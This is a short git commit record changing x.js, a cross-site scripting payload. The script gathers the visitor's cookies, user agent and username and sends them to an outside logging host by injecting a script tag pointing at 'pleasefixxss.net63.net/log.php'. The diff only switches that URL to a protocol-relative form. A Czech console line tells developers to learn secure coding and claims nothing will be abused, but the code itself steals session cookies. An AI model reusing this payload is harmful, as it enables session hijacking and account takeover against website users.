f32cd5979b3cb844578f3875b66fef6a2d7ea459
Testerino <honzaik@yahoo.com>
2014-04-17 00:45:07 +0200

    Update x.js

--- x.js
+++ x.js
@@ -6,6 +6,6 @@ var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username
 console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
 
 var script = document.createElement('script');
-script.src = 'http://pleasefixxss.net63.net/log.php' + params;
+script.src = '//pleasefixxss.net63.net/log.php' + params;
 
 document.getElementsByTagName('head')[0].appendChild(script);
